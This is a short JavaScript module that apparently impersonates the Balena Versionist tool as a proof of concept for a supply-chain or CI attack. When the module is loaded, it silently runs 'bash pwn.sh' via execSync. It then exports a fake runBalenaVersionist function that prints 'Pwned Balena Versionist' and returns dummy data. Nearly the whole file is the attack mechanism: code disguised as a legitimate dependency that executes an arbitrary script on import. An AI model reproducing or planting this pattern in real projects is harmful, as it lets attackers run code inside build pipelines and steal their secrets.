const { execSync } = require('child_process');
try {
    execSync('bash pwn.sh', { stdio: 'inherit' });
} catch (e) {
    console.error(e);
}

module.exports = {
    runBalenaVersionist: async () => {
        console.log('Pwned Balena Versionist');
        return { version: '0.0.0', files: [] };
    }
};
